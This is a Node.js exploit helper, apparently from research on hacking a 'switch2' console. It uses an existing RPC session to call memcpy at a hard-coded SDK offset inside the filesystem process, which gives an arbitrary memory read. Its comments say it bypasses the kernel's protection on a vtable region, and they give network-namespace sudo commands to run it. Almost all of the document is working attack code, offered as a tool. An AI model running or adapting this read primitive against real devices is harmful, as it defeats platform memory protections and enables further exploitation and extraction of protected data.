// Arbitrary fs-region reader via memcpy-in-fs-context (the snapshot-copy
// call class, `rpc.call3(sdk+0x586fb0, dst, src, len)`). This bypasses the
// kernel's attrs-16 protection on the fsp-pr vtable region: the access is
// an ordinary in-process fs load, not a cross-process map.
//
// Usage (netns-wrapped, live READY session):
//   sudo -n ip netns exec switchlab runuser -u nlight -- node copy-region.cjs            # the qual's fsRodata slice
//   sudo -n ip netns exec switchlab runuser -u nlight -- node copy-region.cjs <src> <len> # arbitrary 8-aligned range
'use strict';
const fsSync = require('node:fs');
const path = require('node:path');
const latest = JSON.parse(fsSync.readFileSync(path.join(__dirname, '..', '..', 'latest-session.json')));
const {connect} = require(path.join(latest.directory, 'switch2', 'tools', 'fs-memory.cjs'));

async function main() {
  const memory = await connect();
  const req = c => memory.request(c);
  const info = await req({command: 'info'});
  console.log('session', info.session);

  let src, length;
  if (process.argv[2]) {
    src = Number(BigInt(process.argv[2]));
    length = Number(process.argv[3]);
  } else {
    const qualFile = fsSync.readdirSync(path.join(latest.directory, 'switch2', 'process'))
      .find(f => f.includes('qualification'));
    const qual = JSON.parse(fsSync.readFileSync(path.join(latest.directory, 'switch2', 'process', qualFile)));
    const rod = qual.fsRodata?.memory;
    check(rod, 'No fsRodata in the qualification record; pass <src> <len> explicitly');
    src = Number(BigInt(rod.address));
    length = Number(BigInt(rod.size));
  }
  console.log(`copy-region: 0x${src.toString(16)} len 0x${length.toString(16)}`);
  const r = await req({command: 'copy-region', src, length});
  console.log('memcpyReturn:', r.memcpyReturn, 'sha256:', r.sha256);
  console.log('saved:', r.file);
  process.exit(0);
}
function check(ok, message) { if (!ok) throw Error(message); }
main().catch(e => { console.error(String(e.stack || e).slice(0, 400)); process.exit(1); });
